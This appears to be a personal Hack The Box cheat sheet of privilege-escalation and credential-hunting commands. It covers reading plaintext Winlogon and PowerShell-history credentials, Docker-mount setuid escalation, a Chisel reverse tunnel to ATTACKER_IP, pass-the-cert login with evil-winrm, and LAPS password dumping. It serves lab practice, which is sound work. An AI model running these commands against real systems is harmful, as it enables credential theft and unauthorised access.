# HTB-tips

## Windows Privilege Escalation - Registry Autologon
Sometimes windows stores credentials in plaintext (DefaultDomainName, DefaultUserName,DefaultPassword)

EXAMPLE USAGE:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```


## Windows Privilege Escalation - Powershell history file
Windows stores the powershell history in a file in the psreadlinefolder.(just like linux stores it under the .bash_history).
```
more C:\users\adam\appdata\roaming\microsoft\windows\powershell\psreadline\*.txt
```

## Linux Privilege Escalation - Dcoker Container Mounted files
A docker conatiner is mounted to a home directory. The docker connects the containers file system to the hosts file system -- live. So any changes in the host file system also affects in the docker and vice versa.If the we get root on the docker conatiner(by default we are root inside the docker) this can result in easy priv esc by setting up the setuid to a any binary.

## Linux Privilege Escalation - Port Forwarding using Chisel
Attacker Machine
```bash
chisel server -p ATTACKER_PORT --reverse
```
Target Machine
```bash
chisel client ATTACKER_IP:ATTACKER_PORT R:LOCAL_PORT:127.0.0.1:PORT_RUNNING_ON_TARGET_MACHINE
```

## Windows Exploitation - Pass the Cert
If we get a .pfx file we can get the cert.pem and key.pem from the .pfx file and try to logging in the machine if winrm service is enabled using pass the cert attack.
Extracting the key and cert
```
openssl pkcs12  -in legacyy_dev_auth.pfx -info -nokeys -out cert.pem
openssl pkcs12  -in legacyy_dev_auth.pfx -info -nocerts -nodes -out key.pem
```
After getting the cert and the key we can log-in
```
evil-winrm -i IP -S -k key.pem -c cert.pem
```

## Windows Credentail Hunting - Member of LAPS Group
LAPS is used to store administrator passwords which are complex and randomized, We can use a lapsdumper from github to extract the administrator password
```
lapsdumper.py -u user -p password -d domain.local
```
